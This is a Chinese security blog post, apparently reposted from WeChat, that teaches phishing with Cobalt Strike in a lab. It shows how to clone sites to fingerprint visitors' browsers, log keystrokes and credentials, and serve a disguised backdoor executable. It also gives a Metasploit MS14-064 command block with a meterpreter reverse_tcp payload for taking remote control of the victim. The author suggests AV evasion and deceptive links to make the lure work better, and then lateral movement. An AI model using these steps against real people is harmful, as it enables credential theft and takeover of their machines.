> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IMNWfPyMdaOuLacMUrkWcA)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

授权转载，文章来源：“大余 xiyou” 博客

**0x01 前言**

网络钓鱼是社会工程学攻击方式之一，主要是通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段！  

网络钓鱼攻击是个人和公司在保护其信息安全方面面临的最常见的安全挑战之一。无论是获取密码、信用卡还是其他敏感信息，黑客都在使用电子邮件、社交媒体、电话和任何可能的通信方式窃取有价值的数据。

网络钓鱼攻击的兴起对所有组织都构成了重大威胁。重要的是，如果他们要保护自己的信息，所有组织都应该知道如何发现一些最常见的网络钓鱼骗局。同样还要熟悉攻击者用来实施这些骗局的一些最常见的技术类型。

这篇主要演示如何克隆和利用漏洞等方式进行钓鱼，并控制对方！！

**0x02 环境介绍**

**黑客（攻击者）：  
**

IP：192.168.1.9

系统：kali.2020.4

**VPS 服务器：**

目前演示是用 kali 来架设做 VPS 公网服务器的！道理意义一样！

**办公电脑：**

系统：windwos7 和 windwos xp

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcPjhOzyqIkzyCuCL5HIaPKlOjxyEWYPUkmz6pxkpxNwnQ1BIWKDL57g/640?wx_fmt=png)

目前 kali 上运行了 Cobalt strike ，攻击者在自己的公网 VPS 服务器上制作了后门页面钓鱼，通过各种方式办公电脑收到对方邮件或者各种手段发送的钓鱼链接，最终黑客控制办公电脑的过程！！

**0x03 钓鱼演示**

下面会演示到所有 CS 自带模块中的钓鱼攻击演示！！

**1、智能收集**

打开 System Profiler - 分析器功能…，选择克隆 www.baidu.com 页面做钓鱼…

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcqicnpwF79QMAE9HkgkBqXnUeYmKI9bfiasP6HUicLJnHNgh0DPJZyfozQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLck6hes46GCxpzpVufpoxlNsLczkkjXibCSeWdRjKVyIclCQQ16J2Jeug/640?wx_fmt=png)  

攻击对象访问：http://192.168.1.9/baidu

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLc2krfiaJlffqVdwnicCAnmCruhiaiaEfsXajcvxOhEcUciaQobQayRWeSXLQ/640?wx_fmt=png)  

当通过各种形式… 将 192.168.1.9/baidu 链接发送给对方，让对方点击后… 跳转到了 baidu 页面…  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcxJOOXcGhOBjvhwvdIHzN3vP3dHuibjWPfCHcVwewD441dQFyic1xzVuw/640?wx_fmt=png)

可看到选择应用信息后，钓到了客户用的系统以及浏览器版本型号… 这里别小看两个信息，思路是该模块可以修改，利用溢出代码等形式提权或者获得更多的信息收集… 下面我会写一些演示！！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcRSuOyqxz9VeqaRicich5pLcCbticyicEkjxicV4xxQVDRhqHPPIGwaxZveQ/640?wx_fmt=png)

**2、克隆模块和克隆网站进行键盘记录攻击**

打开 Web Drive-by–Clone Site 克隆网站模块…

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcxibSatT6jlaoE85qhPSxcQMm3THobTO7jvaLnZHoqYPtuaWSLxR4mbQ/640?wx_fmt=png)

这里克隆网站可以是 http 和 https 的 URL… 克隆到 192.168.2.153:801 链接上！！勾选 Log Keystrokes on cloned site 后，记录键盘操作！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcYnNNvuP6kQvKiaTnyboNQrBQ3T0ELgnHkJGyzfs1FPu0D0gf9sQbgzQ/640?wx_fmt=png)

打开 Web Log 功能查看被攻击方登录页面的操作情况！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcN5s3wfV1adcLrfKrPF3j3SichBF08hqbtTZUDj3XRzwvJUqxQ8Q1KEA/640?wx_fmt=png)

可看到访问 192.168.2.153:801 页面输入了用户名密码…

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLclugBmmUdnM1TH26PZticWeiblhFVXydrXC1lMY3zkPibWyAmXeFicmQDGw/640?wx_fmt=png)

可看到记录了对方输入键盘的信息！！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcUWotkhuu1sBJ8v56jZoA2DWEqwxbNpiawS8QHcz7QBdrNiamCSfUbzcg/640?wx_fmt=png)

**3、克隆网站下载执行木马**

打开 Host File 克隆一个页面并提供一个后门文件…

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcpYvDpmegIBj2IKicNCLxlztQgDBflIibUGxz3eG76hRWFgiaU9TPZwWlA/640?wx_fmt=png)

file：选择 CS 生成的 shell，或者 MSF 也行！确定 URL 下载的地址端口链接等情况！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLclngGbUfvoL6essVb6sacelVl9QP90t7whibEjW5xVG7iaH6F2iaNVHwuw/640?wx_fmt=png)

生成 http://192.168.2.153:801/upload.exe 恶意链接…

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcREGDPhvTVfYHtZIlgUk418g9IstWNPCibPiaJwaelzO6hln4EibpiaWicYg/640?wx_fmt=png)

然后回到方法 2 中！！在打开 Clone Site 联动克隆模块，将克隆 baidu 页面，Attack 攻击选择恶意链接页面进行钓鱼！

意思就是对方访问 http://192.168.2.153:801/dayu 页面后会直接下载 attack 恶意链接后门文件，页面正常跳转到百度页面！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcmdPh6n9nj3R7FJMX6hJDE4aUvAQoBlkWDhRpjmODWib4AE1H8eYjppw/640?wx_fmt=png)

可看到 google 访问该页面下载了 upload.exe 生成的 CS 后门文件… 这里 google 带有 web 安全下载防御功能，IE 高版本也会有提示，这种思路是两个模块配合完成的，其中可以修改图标、文件名、弄个免杀、换个欺骗链接，很好钓鱼！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcicIo2kfXH4MDXepUqnLbo8ibLzajMCZicSE9SfNMU8Qcuvpz7UrfRayAQ/640?wx_fmt=png)

**4、****Metasploit 溢出代码与 Cobalt Strik 配合钓鱼**

本次演示的是思路，拿的是一个针对 XP 或者以下系统，利用 MS14_064 利用 IE 执行远控木马… 记住是思路！！

这里很简单，MSF 执行 exploit 即可获得恶意链接：http://192.168.2.153:6666/Sixcra！

```
use exploit/windows/browser/ms14_064_ole_code_execution
set srvhost 192.168.2.153
set SRVPORT 6666
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.2.153
exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcPGiccLlibUIdswdffM8jCcxwH8bxmdslicbG7rKygJwibOWgGkTbMMTFNw/640?wx_fmt=png)

很简单，利用和方法 3 一样，打开克隆网站模块，放入 Attack 即可！！这里就不勾选键盘记录了，因为直接能控制对方了！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLccvyxOC6RLMc1CqRicouX0ALzT8RicbTiarkgm8VkPiac97OygKnodvbQPg/640?wx_fmt=png)

生成 URL：http://192.168.2.153:80/baidu

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcy2Q1Tt3dRib7O2oFmTUFZwkLKXZbyGkHBghkgeLNaA0YRMxN8xhobKg/640?wx_fmt=png)

可看到当对方访问做好的 http://192.168.2.153:80/baidu 钓鱼页面后，直接跳转到了百度… 但是通过溢出漏洞在攻击端获得了对方的控制 shell…  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLczzB02rx5VCN9WAOVcPbCfgxDsBl9uDOFF50F63dOSSy4IiaRqsmsxfg/640?wx_fmt=png)

通过控制，继续横向渗透即可！！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcBNGgJPj63qjRGAZF7tOPgZ2mID48O0ibRvMoQLFDYRibmV5FibpsibS1uQ/640?wx_fmt=png)

**0x05 总结**

这里有四种方法，总结下思路，就是各种模块之间的配合进行简单的钓鱼，知道这些思路后，还可以和别的钓鱼工具配合，或者是别的方法融合！  

这里提醒下，如果在克隆模块克隆的是 HTTPS 的页面，需要在攻击方加载 SSL 哦，不然没法记录或者执行！！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

只需关注公众号并回复 “9527” 即可获取一套 HTB 靶场学习文档和视频，“1120” 获取安全参考等安全杂志 PDF 电子版，“1208” 获取个人常用高效爆破字典，“0221” 获取 2020 年酒仙桥文章打包，还在等什么？赶紧关注学习吧！

* * *

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcAcRDPBsTMEQ0pGhzmYrBp7pvhtHnb0sJiaBzhHIILwpLtxYnPjqKmibA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484585&idx=1&sn=28a90949e019f9059cf9b48f4d888b2d&chksm=cfa6a0baf8d129ac29061ecee4f459fa8a13d35e68e4d799d5667b1f87dcc76f5bf1604fe5c5&scene=21#wechat_redirect)[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)